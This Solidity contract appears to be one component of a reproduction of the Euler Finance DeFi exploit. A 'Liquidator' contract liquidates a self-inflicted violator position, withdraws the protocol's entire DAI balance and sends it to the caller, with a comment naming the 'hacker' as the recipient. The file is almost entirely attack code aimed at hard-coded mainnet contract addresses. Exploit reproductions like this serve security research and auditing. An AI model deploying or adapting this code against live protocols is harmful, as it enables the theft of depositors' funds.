// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IAaveV2} from "src/interfaces/Aave.sol";
import {IEuler} from "src/interfaces/Euler.sol";
import {IERC20} from "src/interfaces/ERC20.sol";
import {IEToken} from "src/interfaces/EToken.sol";
import {IDToken} from "src/interfaces/DToken.sol";

contract Liquidator {
    address constant EULER_PROTOCOL = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEToken eDAI = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IDToken dDAI = IDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);

    function liquidate(address liquidator, address violator) external {
        // Prepare the liquidation return data
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(liquidator, violator, address(DAI), address(DAI));
        // Perform the liquidation
        Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);
        eDAI.withdraw(0, DAI.balanceOf(EULER_PROTOCOL));
        // Transfer profits to the hacker
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
